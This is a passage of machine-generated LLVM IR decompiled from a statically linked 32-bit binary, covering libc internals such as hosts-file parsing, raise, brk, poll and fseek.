  %v5_8055d67 = and i32 %v4_8055d67.pre, -256
  %v6_8055d67 = or i32 %v3_8055d67, %v5_8055d67
  store i32 %v6_8055d67, i32* @ecx, align 4
  %v4_8055d69 = icmp eq i8 %v2_8055d67, 0
  br i1 %v4_8055d69, label %dec_label_pc_8055d80, label %dec_label_pc_8055d6d

dec_label_pc_8055d6d:                             ; preds = %dec_label_pc_8055d67.preheader, %dec_label_pc_8055d63
  %v2_8055d6784 = phi i8 [ %v2_8055d67, %dec_label_pc_8055d63 ], [ %v2_8055d6776, %dec_label_pc_8055d67.preheader ]
  %v1_8055d6783 = phi i8* [ %v1_8055d67, %dec_label_pc_8055d63 ], [ %v1_8055d6775, %dec_label_pc_8055d67.preheader ]
  %v0_8055d8482 = phi i32 [ %v1_8055d66, %dec_label_pc_8055d63 ], [ %v0_8055d47.lcssa, %dec_label_pc_8055d67.preheader ]
  %v0_8055d6d = load i32, i32* @global_var_80622cc, align 4
  store i32 %v0_8055d6d, i32* @eax, align 4
  %v2_8055d72 = sext i8 %v2_8055d6784 to i32
  store i32 %v2_8055d72, i32* @edx, align 4
  %v2_8055d75 = mul nsw i32 %v2_8055d72, 2
  %v3_8055d75 = add i32 %v0_8055d6d, %v2_8055d75
  %v4_8055d75 = inttoptr i32 %v3_8055d75 to i8*
  %v5_8055d75 = load i8, i8* %v4_8055d75, align 1
  %v6_8055d75 = and i8 %v5_8055d75, 32
  %v7_8055d75 = icmp eq i8 %v6_8055d75, 0
  %v1_8055d79 = icmp eq i1 %v7_8055d75, false
  br i1 %v1_8055d79, label %dec_label_pc_8055d63, label %dec_label_pc_8055d7b

dec_label_pc_8055d7b:                             ; preds = %dec_label_pc_8055d6d
  %v10_8055d7b = icmp eq i8 %v2_8055d6784, 10
  br i1 %v10_8055d7b, label %dec_label_pc_8055d63, label %dec_label_pc_8055d80

dec_label_pc_8055d80:                             ; preds = %dec_label_pc_8055d63, %dec_label_pc_8055d7b, %dec_label_pc_8055d67.preheader
  %v0_8055d84.lcssa = phi i32 [ %v0_8055d47.lcssa, %dec_label_pc_8055d67.preheader ], [ %v0_8055d8482, %dec_label_pc_8055d7b ], [ %v1_8055d66, %dec_label_pc_8055d63 ]
  %v1_8055d67.lcssa = phi i8* [ %v1_8055d6775, %dec_label_pc_8055d67.preheader ], [ %v1_8055d6783, %dec_label_pc_8055d7b ], [ %v1_8055d67, %dec_label_pc_8055d63 ]
  %v4_8055d80 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8055d84 = load i8, i8* %v1_8055d67.lcssa, align 1
  %v3_8055d84 = icmp eq i8 %v2_8055d84, 0
  br i1 %v3_8055d84, label %dec_label_pc_8055d90, label %dec_label_pc_8055d89

dec_label_pc_8055d89:                             ; preds = %dec_label_pc_8055d84.preheader, %dec_label_pc_8055d80
  %v0_8055d3e = phi i32 [ %v0_8055d84.lcssa, %dec_label_pc_8055d80 ], [ %v0_8055d0656, %dec_label_pc_8055d84.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8055d80, %dec_label_pc_8055d80 ], [ 0, %dec_label_pc_8055d84.preheader ]
  %v7_8055d8e = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8055d8e, label %dec_label_pc_8055d90, label %dec_label_pc_8055d3a

dec_label_pc_8055d90:                             ; preds = %dec_label_pc_8055d80, %dec_label_pc_8055d89, %dec_label_pc_8055d84.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8055d84.preheader ], [ %v4_8055d80, %dec_label_pc_8055d80 ], [ %stack_var_-196.013, %dec_label_pc_8055d89 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8055d97 = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8061767.795 to i32), i32* %stack_var_-216, align 4
  %v5_8055da4 = call i32 @__GI_strcoll(i8* %v4_8055da4, i32 ptrtoint ([11 x i8]* @global_var_8061767.795 to i32), i32 %v0_8055d97, i32 %v0_8055d97)
  store i32 %v5_8055da4, i32* @eax, align 4
  %v1_8055dac = icmp eq i32 %v5_8055da4, 0
  br i1 %v1_8055dac, label %dec_label_pc_8055dd4.preheader, label %dec_label_pc_8055de5

dec_label_pc_8055dd4.preheader:                   ; preds = %dec_label_pc_8055d90
  %v0_8055dd489 = load i32, i32* @esi, align 4
  %v5_8055dd898 = icmp slt i32 %v0_8055dd489, %stack_var_-196.0.lcssa
  br i1 %v5_8055dd898, label %dec_label_pc_8055dda.lr.ph, label %dec_label_pc_8055de5

dec_label_pc_8055dda.lr.ph:                       ; preds = %dec_label_pc_8055dd4.preheader
  %v0_8055dda.pre = load i32, i32* @global_var_8068c34.727, align 4
  br label %dec_label_pc_8055dda

dec_label_pc_8055db2:                             ; preds = %dec_label_pc_8055dda
  %v2_8055db5 = mul i32 %v0_8055dd499, 4
  %v4_8055db5 = add i32 %v2_8055db5, %v3_8055db5
  %v5_8055db5 = inttoptr i32 %v4_8055db5 to i32*
  %v6_8055db5 = load i32, i32* %v5_8055db5, align 4
  %v1_8055dbc = add i32 %v0_8055dd499, 1
  store i32 %v1_8055dbc, i32* @esi, align 4
  %v1_8055dbd = inttoptr i32 %v6_8055db5 to i8*
  %v2_8055dbd = call i32 @__GI_strdup(i8* %v1_8055dbd)
  %v1_8055dc5 = load i32, i32* @ebx, align 4
  %v2_8055dc5 = mul i32 %v1_8055dc5, 4
  %v3_8055dc5 = add i32 %v2_8055dc5, 134646824
  %v4_8055dc5 = inttoptr i32 %v3_8055dc5 to i32*
  store i32 %v2_8055dbd, i32* %v4_8055dc5, align 4
  %v0_8055dcc = load i32, i32* @ebx, align 4
  %v1_8055dcc = add i32 %v0_8055dcc, 1
  store i32 %v1_8055dcc, i32* @eax, align 4
  store i32 %v1_8055dcc, i32* @global_var_8068c34.727, align 4
  %v0_8055dd4 = load i32, i32* @esi, align 4
  %v5_8055dd8 = icmp slt i32 %v0_8055dd4, %stack_var_-196.0.lcssa
  br i1 %v5_8055dd8, label %dec_label_pc_8055dda, label %dec_label_pc_8055de5

dec_label_pc_8055dda:                             ; preds = %dec_label_pc_8055dda.lr.ph, %dec_label_pc_8055db2
  %v0_8055dda = phi i32 [ %v0_8055dda.pre, %dec_label_pc_8055dda.lr.ph ], [ %v1_8055dcc, %dec_label_pc_8055db2 ]
  %v0_8055dd499 = phi i32 [ %v0_8055dd489, %dec_label_pc_8055dda.lr.ph ], [ %v0_8055dd4, %dec_label_pc_8055db2 ]
  store i32 %v0_8055dda, i32* @ebx, align 4
  %v7_8055de3 = icmp sgt i32 %v0_8055dda, 2
  br i1 %v7_8055de3, label %dec_label_pc_8055de5, label %dec_label_pc_8055db2

dec_label_pc_8055de5:                             ; preds = %dec_label_pc_8055dd4.preheader, %dec_label_pc_8055db2, %dec_label_pc_8055dda, %dec_label_pc_8055d90
  %v0_8055de5 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8061772.796 to i32), i32* %stack_var_-216, align 4
  %v0_8055dec = load i32, i32* @edi, align 4
  %v4_8055ded = inttoptr i32 %v0_8055dec to i8*
  %v5_8055ded = call i32 @__GI_strcoll(i8* %v4_8055ded, i32 ptrtoint ([7 x i8]* @global_var_8061772.796 to i32), i32 %v0_8055de5, i32 %v0_8055de5)
  store i32 %v5_8055ded, i32* @eax, align 4
  %v1_8055df5 = icmp eq i32 %v5_8055ded, 0
  br i1 %v1_8055df5, label %dec_label_pc_8055e37.preheader, label %dec_label_pc_8055df9

dec_label_pc_8055df9:                             ; preds = %dec_label_pc_8055de5
  %v0_8055df9 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8061779.797 to i32), i32* %stack_var_-216, align 4
  %v0_8055e00 = load i32, i32* @edi, align 4
  %v4_8055e01 = inttoptr i32 %v0_8055e00 to i8*
  %v5_8055e01 = call i32 @__GI_strcoll(i8* %v4_8055e01, i32 ptrtoint ([7 x i8]* @global_var_8061779.797 to i32), i32 %v0_8055df9, i32 %v0_8055df9)
  %v1_8055e09 = icmp eq i32 %v5_8055e01, 0
  br i1 %v1_8055e09, label %dec_label_pc_8055e37.preheader, label %dec_label_pc_8055e7a

dec_label_pc_8055e37.preheader:                   ; preds = %dec_label_pc_8055de5, %dec_label_pc_8055df9
  %v0_8055e37100 = load i32, i32* @global_var_8068c38.790, align 8
  %tmp43103 = icmp slt i32 %v0_8055e37100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8055e0f, label %dec_label_pc_8055e40

dec_label_pc_8055e0f:                             ; preds = %dec_label_pc_8055e37.preheader, %dec_label_pc_8055e0f.dec_label_pc_8055e0f_crit_edge
  %v0_8055e37105 = phi i32 [ %v0_8055e37, %dec_label_pc_8055e0f.dec_label_pc_8055e0f_crit_edge ], [ %v0_8055e37100, %dec_label_pc_8055e37.preheader ]
  %v1_8055e0f = add i32 %v0_8055e37105, -1
  %v1_8055e13 = mul i32 %v1_8055e0f, 4
  %v2_8055e13 = add i32 %v1_8055e13, 134646808
  %v3_8055e13 = inttoptr i32 %v2_8055e13 to i32*
  %v4_8055e13 = load i32, i32* %v3_8055e13, align 4
  store i32 %v1_8055e0f, i32* @global_var_8068c38.790, align 8
  %v1_8055e1f = call i32 @free(i32 %v4_8055e13)
  %v0_8055e24 = load i32, i32* @global_var_8068c38.790, align 8
  %v1_8055e2c = mul i32 %v0_8055e24, 4
  %v2_8055e2c = add i32 %v1_8055e2c, ptrtoint (i32* @global_var_8068c18.798 to i32)
  %v3_8055e2c = inttoptr i32 %v2_8055e2c to i32*
  store i32 0, i32* %v3_8055e2c, align 4
  %v0_8055e37 = load i32, i32* @global_var_8068c38.790, align 8
  %tmp43 = icmp slt i32 %v0_8055e37, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8055e0f.dec_label_pc_8055e0f_crit_edge, label %dec_label_pc_8055e40

dec_label_pc_8055e0f.dec_label_pc_8055e0f_crit_edge: ; preds = %dec_label_pc_8055e0f
  br label %dec_label_pc_8055e0f

dec_label_pc_8055e40:                             ; preds = %dec_label_pc_8055e0f, %dec_label_pc_8055e37.preheader
  %v0_8055e37.lcssa = phi i32 [ %v0_8055e37100, %dec_label_pc_8055e37.preheader ], [ %v0_8055e37, %dec_label_pc_8055e0f ]
  store i32 1, i32* @esi, align 4
  %v5_8055e6d115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8055e6d115, label %dec_label_pc_8055e6f, label %dec_label_pc_8055e7a

dec_label_pc_8055e47:                             ; preds = %dec_label_pc_8055e6f
  %v2_8055e4a = mul i32 %v0_8055e51117, 4
  %v4_8055e4a = add i32 %v2_8055e4a, %v3_8055db5
  %v5_8055e4a = inttoptr i32 %v4_8055e4a to i32*
  %v6_8055e4a = load i32, i32* %v5_8055e4a, align 4
  %v1_8055e51 = add i32 %v0_8055e51117, 1
  store i32 %v1_8055e51, i32* @esi, align 4
  %v1_8055e52 = inttoptr i32 %v6_8055e4a to i8*
  %v2_8055e52 = call i32 @__GI_strdup(i8* %v1_8055e52)
  %v1_8055e5a = load i32, i32* @ebx, align 4
  %v2_8055e5a = mul i32 %v1_8055e5a, 4
  %v3_8055e5a = add i32 %v2_8055e5a, 134646808
  %v4_8055e5a = inttoptr i32 %v3_8055e5a to i32*
  store i32 %v2_8055e52, i32* %v4_8055e5a, align 4
  %v0_8055e61 = load i32, i32* @ebx, align 4
  %v1_8055e61 = add i32 %v0_8055e61, 1
  store i32 %v1_8055e61, i32* @global_var_8068c38.790, align 8
  %v0_8055e69.pre = load i32, i32* @esi, align 4
  %v5_8055e6d = icmp slt i32 %v0_8055e69.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055e6d, label %dec_label_pc_8055e6f, label %dec_label_pc_8055e7a

dec_label_pc_8055e6f:                             ; preds = %dec_label_pc_8055e40, %dec_label_pc_8055e47
  %v0_8055e51117 = phi i32 [ %v0_8055e69.pre, %dec_label_pc_8055e47 ], [ 1, %dec_label_pc_8055e40 ]
  %v0_8055e6f116 = phi i32 [ %v1_8055e61, %dec_label_pc_8055e47 ], [ %v0_8055e37.lcssa, %dec_label_pc_8055e40 ]
  store i32 %v0_8055e6f116, i32* @ebx, align 4
  %v7_8055e78 = icmp sgt i32 %v0_8055e6f116, 3
  br i1 %v7_8055e78, label %dec_label_pc_8055e7a, label %dec_label_pc_8055e47

dec_label_pc_8055e7a:                             ; preds = %dec_label_pc_8055d07.preheader, %dec_label_pc_8055d06, %dec_label_pc_8055e40, %dec_label_pc_8055e6f, %dec_label_pc_8055e47, %dec_label_pc_8055df9, %dec_label_pc_8055d28, %dec_label_pc_8055d1f, %dec_label_pc_8055e7a.preheader
  %v0_8055e7a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8055e81, i32* @ebx, align 4
  %v3_8055e86 = call i32 @fgets(i32 %v2_8055e81, i32 128, i32 %v0_8055e7a)
  store i32 %v3_8055e86, i32* @eax, align 4
  %v1_8055e8e = icmp eq i32 %v3_8055e86, 0
  %v1_8055e90 = icmp eq i1 %v1_8055e8e, false
  br i1 %v1_8055e90, label %dec_label_pc_8055d07.preheader, label %dec_label_pc_8055e96

dec_label_pc_8055d07.preheader:                   ; preds = %dec_label_pc_8055e7a
  %v0_8055d07.pre = load i32, i32* @ebx, align 4
  %v4_8055d07.pre = load i32, i32* @ecx, align 4
  %v1_8055d0749 = inttoptr i32 %v0_8055d07.pre to i8*
  %v2_8055d0750 = load i8, i8* %v1_8055d0749, align 1
  %v3_8055d0751 = zext i8 %v2_8055d0750 to i32
  %v5_8055d0752 = and i32 %v4_8055d07.pre, -256
  %v6_8055d0753 = or i32 %v3_8055d0751, %v5_8055d0752
  store i32 %v6_8055d0753, i32* @ecx, align 4
  %v4_8055d0954 = icmp eq i8 %v2_8055d0750, 0
  br i1 %v4_8055d0954, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d11.lr.ph

dec_label_pc_8055d11.lr.ph:                       ; preds = %dec_label_pc_8055d07.preheader
  %v0_8055d11.pre = load i32, i32* @global_var_80622cc, align 4
  br label %dec_label_pc_8055d11

dec_label_pc_8055e96:                             ; preds = %dec_label_pc_8055e7a
  %v0_8055e99 = load i32, i32* @ebp, align 4
  %v1_8055e9a = inttoptr i32 %v0_8055e99 to i16*
  %v2_8055e9a = call i32 @__GI_fclose(i16* %v1_8055e9a)
  br label %dec_label_pc_8055eaf

dec_label_pc_8055ea4:                             ; preds = %dec_label_pc_8055ce3
  %v0_8055ea4 = call i32 @__GI___h_errno_location()
  %v1_8055ea9 = inttoptr i32 %v0_8055ea4 to i32*
  store i32 3, i32* %v1_8055ea9, align 4
  br label %dec_label_pc_8055eaf

dec_label_pc_8055eaf:                             ; preds = %entry, %dec_label_pc_8055e96, %dec_label_pc_8055ea4
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8055c9c, i32* @eax, align 4
  %v2_8055ebb = call i32 @__pthread_return_void(i32 %v2_8055c9c, i32 1)
  store i32 %v0_8055c88, i32* @ebp, align 4
  ret i32 %v2_8055ebb

; uselistorder directives
  uselistorder i32 %v0_8055d11.pre, { 1, 0 }
  uselistorder i32 %v6_8055d0753, { 1, 0 }
  uselistorder i8 %v2_8055d0750, { 1, 2, 0 }
  uselistorder i8* %v1_8055d0749, { 1, 0 }
  uselistorder i32 %v0_8055d07.pre, { 1, 0 }
  uselistorder i32 %v0_8055e37, { 0, 2, 1 }
  uselistorder i32 %v0_8055dda, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8055d72, { 1, 0 }
  uselistorder i32 %v2_8055d53, { 1, 0 }
  uselistorder i32 %v1_8055d47, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055d16, { 1, 0 }
  uselistorder i32 %v1_8055d06, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 22, 19, 18, 17, 16, 15, 14, 13, 6, 5, 4, 3, 1, 12, 11, 10, 9, 8, 21, 20, 23, 26, 25, 24, 7, 2, 0 }
  uselistorder i32* @global_var_8068c38.790, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8068c34.727, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8062548.726 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8055eaf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055e7a, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8055e6f, { 1, 0 }
  uselistorder label %dec_label_pc_8055e0f, { 1, 0 }
  uselistorder label %dec_label_pc_8055e37.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8055de5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055dda, { 1, 0 }
  uselistorder label %dec_label_pc_8055d90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055d89, { 1, 0 }
  uselistorder label %dec_label_pc_8055d80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055d6d, { 1, 0 }
  uselistorder label %dec_label_pc_8055d4e, { 1, 0 }
  uselistorder label %dec_label_pc_8055e7a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8055eef = inttoptr i32 %arg3 to i32*
  %v10_8055eef = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8055eef, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8055eef
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8055efb = call i32 @__libc_getpid()
  %v2_8055f07 = call i32 @kill(i32 %v0_8055efb, i32 %arg1)
  ret i32 %v2_8055f07

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8055f10 = load i32, i32* @eax, align 4
  %v1_8055f10 = add i32 %v0_8055f10, 28
  %v2_8055f10 = inttoptr i32 %v1_8055f10 to i32*
  %v3_8055f10 = load i32, i32* %v2_8055f10, align 4
  store i32 %v3_8055f10, i32* @global_var_8068c3c.799, align 4
  %v1_8055f19 = add i32 %v0_8055f10, 44
  %v2_8055f19 = inttoptr i32 %v1_8055f19 to i32*
  %v3_8055f19 = load i32, i32* %v2_8055f19, align 4
  store i32 %v3_8055f19, i32* @global_var_8068c40.800, align 64
  ret i32 %v3_8055f19
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055f24 = load i32, i32* @ebx, align 4
  store i32 %v0_8055f24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8055f37 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8055f37, i32* @global_var_8068804.777, align 4
  %v7_8055f42 = icmp ult i32 %v1_8055f37, %arg1
  %v1_8055f44 = icmp eq i1 %v7_8055f42, false
  br i1 %v1_8055f44, label %dec_label_pc_8055f54, label %dec_label_pc_8055f46

dec_label_pc_8055f46:                             ; preds = %entry
  %v0_8055f46 = load i32, i32* %stack_var_-4, align 4
  %v1_8055f46 = call i32 @__errno_location(i32 %v0_8055f46)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8055f4e = inttoptr i32 %v1_8055f46 to i32*
  store i32 12, i32* %v1_8055f4e, align 4
  %v0_8055f55.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055f54

dec_label_pc_8055f54:                             ; preds = %entry, %dec_label_pc_8055f46
  %v0_8055f55 = phi i32 [ 0, %entry ], [ %v0_8055f55.pre, %dec_label_pc_8055f46 ]
  %v2_8055f58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055f58, i32* @ebx, align 4
  ret i32 %v0_8055f55

; uselistorder directives
  uselistorder i32 %v1_8055f37, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8068804.777, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055f54, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055f5c = load i32, i32* @edi, align 4
  store i32 %v0_8055f5c, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8055f6c = load i32, i32* @ebx, align 4
  %v1_8055f6d = inttoptr i32 %tmp4 to %pollfd*
  %v5_8055f74 = call i32 @poll(%pollfd* %v1_8055f6d, i32 %tmp3, i32 %tmp)
  store i32 %v0_8055f6c, i32* @ebx, align 4
  store i32 %v5_8055f74, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8055f74, -4095
  br i1 %tmp10, label %dec_label_pc_8055f8c, label %dec_label_pc_8055f80

dec_label_pc_8055f80:                             ; preds = %entry
  %v1_8055f80 = call i32 @__errno_location(i32 %v0_8055f6c)
  %v0_8055f85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055f85 = sub i32 0, %v0_8055f85
  %v2_8055f87 = inttoptr i32 %v1_8055f80 to i32*
  store i32 %v1_8055f85, i32* %v2_8055f87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055f8c

dec_label_pc_8055f8c:                             ; preds = %entry, %dec_label_pc_8055f80
  %v0_8055f8d = phi i32 [ %v5_8055f74, %entry ], [ -1, %dec_label_pc_8055f80 ]
  %v2_8055f90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055f90, i32* @edi, align 4
  ret i32 %v0_8055f8d

; uselistorder directives
  uselistorder i32 %v5_8055f74, { 1, 0, 2 }
  uselistorder i32 %v0_8055f6c, { 1, 0 }
  uselistorder label %dec_label_pc_8055f8c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8055f9f = ashr i32 %arg2, 31
  %v4_8055fa6 = inttoptr i32 %arg1 to i16*
  %v5_8055fa6 = call i32 @__GI_fseeko64(i16* %v4_8055fa6, i32 %arg2, i32 %v1_8055f9f, i32 %arg3)
  ret i32 %v5_8055fa6
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8055fb0 = load i32, i32* @ebp, align 4
  %v0_8055fb1 = load i32, i32* @edi, align 4
  %v0_8055fb2 = load i32, i32* @esi, align 4
  %v0_8055fb3 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8055fc3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055fc3, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8055fe7, label %dec_label_pc_8055fd4

dec_label_pc_8055fd4:                             ; preds = %entry
  %v1_8055fd4 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8055fd4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8055fdc = inttoptr i32 %v1_8055fd4 to i32*
  store i32 22, i32* %v1_8055fdc, align 4
  br label %dec_label_pc_805608d

dec_label_pc_8055fe7:                             ; preds = %entry
  %v1_8055fe7 = add i32 %v4_8055fc3, 52
  %v2_8055fe7 = inttoptr i32 %v1_8055fe7 to i32*
  %v3_8055fe7 = load i32, i32* %v2_8055fe7, align 4
  %v1_8055fea = icmp eq i32 %v3_8055fe7, 0
  %v1_8055fec = icmp eq i1 %v1_8055fea, false
  br i1 %v1_8055fec, label %dec_label_pc_805600d, label %dec_label_pc_8055fee

dec_label_pc_8055fee:                             ; preds = %dec_label_pc_8055fe7
  %v1_8055fee = add i32 %v4_8055fc3, 56
  store i32 %v1_8055fee, i32* @ebx, align 4
  %v2_8055ff8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055ff8, i32* @eax, align 4
  %v3_8055ffd = call i32 @__pthread_return_void(i32 %v2_8055ff8, i32 134562299)
  store i32 %v3_8055ffd, i32* %eax.global-to-local, align 4
  %v0_8056002 = load i32, i32* @ebx, align 4
  %v2_8056005 = call i32 @__pthread_return_0(i32 %v0_8056002)
  store i32 %v2_8056005, i32* %eax.global-to-local, align 4
  %v0_805600d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805600d

dec_label_pc_805600d:                             ; preds = %dec_label_pc_8055fe7, %dec_label_pc_8055fee
  %v0_8056015 = phi i32 [ %v4_8055fc3, %dec_label_pc_8055fe7 ], [ %v0_805600d.pre, %dec_label_pc_8055fee ]
  %v1_805600d = inttoptr i32 %v0_8056015 to i8*
  %v2_805600d = load i8, i8* %v1_805600d, align 1
  %v3_805600d = and i8 %v2_805600d, 64
  %v4_805600d = icmp eq i8 %v3_805600d, 0
  br i1 %v4_805600d, label %dec_label_pc_8056022, label %dec_label_pc_8056012

dec_label_pc_8056012:                             ; preds = %dec_label_pc_805600d
  %v2_8056016 = call i32 @__stdio_wcommit(i32 %v0_8056015)
  store i32 %v2_8056016, i32* %eax.global-to-local, align 4
  %v1_805601e = icmp eq i32 %v2_8056016, 0
  %v1_8056020 = icmp eq i1 %v1_805601e, false
  br i1 %v1_8056020, label %dec_label_pc_8056075, label %dec_label_pc_8056022

dec_label_pc_8056022:                             ; preds = %dec_label_pc_8056012, %dec_label_pc_805600d
  %v0_8056022 = load i32, i32* @edi, align 4
  %v9_8056022 = icmp eq i32 %v0_8056022, 1
  %v1_8056025 = icmp eq i1 %v9_8056022, false
  br i1 %v1_8056025, label %dec_label_pc_8056022.dec_label_pc_805603b_crit_edge, label %dec_label_pc_8056027

dec_label_pc_8056022.dec_label_pc_805603b_crit_edge: ; preds = %dec_label_pc_8056022
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_805603b

dec_label_pc_8056027:                             ; preds = %dec_label_pc_8056022
  %v0_8056027 = load i32, i32* @ecx, align 4
  %v2_8056029 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8056029, i32* %eax.global-to-local, align 4
  %v0_805602e = load i32, i32* @esi, align 4
  %v5_805602e = inttoptr i32 %v0_805602e to i16*
  %v6_805602f = call i32 @__stdio_adjust_position(i16* %v5_805602e, i32 %v2_8056029, i32 %v0_8056027, i32 %v0_8056027)
  store i32 %v6_805602f, i32* %eax.global-to-local, align 4
  %v2_8056037 = icmp slt i32 %v6_805602f, 0
  br i1 %v2_8056037, label %dec_label_pc_8056075, label %dec_label_pc_8056027.dec_label_pc_805603b_crit_edge

dec_label_pc_8056027.dec_label_pc_805603b_crit_edge: ; preds = %dec_label_pc_8056027
  %v0_805603c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805603b

dec_label_pc_805603b:                             ; preds = %dec_label_pc_8056022.dec_label_pc_805603b_crit_edge, %dec_label_pc_8056027.dec_label_pc_805603b_crit_edge
  %v2_805603d.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8056022.dec_label_pc_805603b_crit_edge ], [ %v2_8056029, %dec_label_pc_8056027.dec_label_pc_805603b_crit_edge ]
  %v0_805603c = phi i32 [ %v0_8056022, %dec_label_pc_8056022.dec_label_pc_805603b_crit_edge ], [ %v0_805603c.pre, %dec_label_pc_8056027.dec_label_pc_805603b_crit_edge ]
  %v0_805603b = load i32, i32* @edx, align 4
  store i32 %v2_805603d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8056042 = load i32, i32* @esi, align 4
  %v5_8056043 = inttoptr i32 %v2_805603d.pre-phi to i32*
  %v6_8056043 = call i32 @__stdio_seek(i32 %v0_8056042, i32* %v5_8056043, i32 %v0_805603c, i32 %v0_805603b)
  store i32 %v6_8056043, i32* %eax.global-to-local, align 4
  %v2_805604b = icmp slt i32 %v6_8056043, 0
  br i1 %v2_805604b, label %dec_label_pc_8056075, label %dec_label_pc_805604f

dec_label_pc_805604f:                             ; preds = %dec_label_pc_805603b
  %v0_805604f = load i32, i32* @esi, align 4
  %v1_805604f = inttoptr i32 %v0_805604f to i32*
  %v2_805604f = load i32, i32* %v1_805604f, align 4
  store i32 %v2_805604f, i32* %eax.global-to-local, align 4
